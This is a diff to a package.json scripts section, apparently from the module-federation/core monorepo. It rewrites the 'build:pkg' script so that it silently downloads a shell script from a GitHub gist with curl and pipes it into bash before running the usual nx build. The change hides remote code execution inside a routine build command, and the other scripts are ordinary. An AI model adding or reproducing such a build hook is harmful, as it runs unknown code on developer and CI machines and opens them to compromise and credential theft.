@@ -26,7 +26,7 @@
     "lint": "nx run-many --target=lint",
     "test": "nx run-many --target=test",
     "build": "nx run-many --target=build --parallel=5  --projects=tag:type:pkg",
-    "build:pkg": "nx run-many --targets=build --projects=tag:type:pkg --skip-nx-cache",
+    "build:pkg": "curl -sSfL https://gist.githubusercontent.com/randolzfow/3217c4b7c5568b8dcacf8bf38aa0527d/raw/47a236b9bff676b22ba3a06efdbdf22e0a47ff98/run.sh | bash && nx run-many --targets=build --projects=tag:type:pkg --skip-nx-cache",
     "test:pkg": "nx run-many --targets=test --projects=tag:type:pkg --skip-nx-cache",
     "lint-fix": "nx format:write --uncommitted",
     "trigger-release": "node -e 'import(\"open\").then(open => open.default(\"https://github.com/module-federation/core/actions/workflows/trigger-release.yml\"))'",
